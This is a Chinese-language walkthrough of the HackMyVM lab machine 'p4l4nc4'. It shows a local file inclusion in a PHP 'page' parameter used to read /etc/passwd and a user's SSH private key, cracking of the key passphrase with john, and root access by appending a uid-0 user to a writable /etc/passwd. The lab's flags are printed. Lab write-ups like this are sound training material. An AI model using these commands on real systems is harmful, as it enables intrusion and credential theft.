# p4l4nc4

2025.03.17 https://hackmyvm.eu/machines/machine.php?vm=p4l4nc4

[video]()

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

看到虚拟机上显示的用户名 4ng014

web 上只找到了http://192.168.5.39/robots.txt 使用 cewl 将它的单词拉取下来，将单词字典作为目录再次扫描 web，但是什么都没有。

使用字典爆破一下上面的用户 ssh 密码，但是没戏。

同时发现用户名使用的是 1337 format 格式(把拉丁字母转变成数字或是特殊符号)，可能字典密码中也需要进行这样处理，爆破之后也还是没戏:

```
o -> 0
l -> 1
e -> 3
a -> 4
s -> 5
g -> 6
t -> 7
i -> 1

cat pass.txt|sed -e 's/a/4/g' -e 's/e/3/g' -e 's/i/1/g' -e 's/l/1/g' -e 's/o/0/g' -e 's/s/5/g' -e 's/t/7/g' | tr '[:upper:]' '[:lower:]' | sort | uniq > new_pass
```

再用这个字典扫描一下 web 目录，发现 http://192.168.5.39/n3gr4/ 使用同样的字典对这个目录进行扫描，发现 http://192.168.5.39/n3gr4/m414nj3.php 可能缺少参数，使用字典 /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt 进行探测，发现 page 参数，看参数的名字像是存在 LFI，读取下/etc/passwd 文件，可以读取:

```
curl http://192.168.5.39/n3gr4/m414nj3.php?page=/etc/passwd

p4l4nc4:x:1000:1000:p4l4nc4,,,:/home/p4l4nc4:/bin/bash
```

在使用常见的 /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt 进行探测，access.log 等日志文件都不能读取。

看看 p4l4nc4 这个用户的私钥能不能读取，果然能读取到 /home/p4l4nc4/.ssh/id_rsa , 拿到私钥之后，使用 ssh 登陆，但是私钥有密码，使用 john + rockyou 得到密码 friendster ，再次 ssh 登陆输入私钥密码。

拿到了 user flag:

```
p4l4nc4@4ng014:~$ cat user.txt
HMV{6cfb952777b95ded50a5be3a4ee9417af7e6dcd1}
```

枚举，发现 /etc/passwd 文件可写，直接新建一个超级用户：

```
openssl passwd -1 -salt new 123

echo 'admin:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

切换到 admin 用户输入密码 123 拿到 root flag:

```
root@4ng014:~# cat root.txt
HMV{4c3b9d0468240fbd4a9148c8559600fe2f9ad727}
```
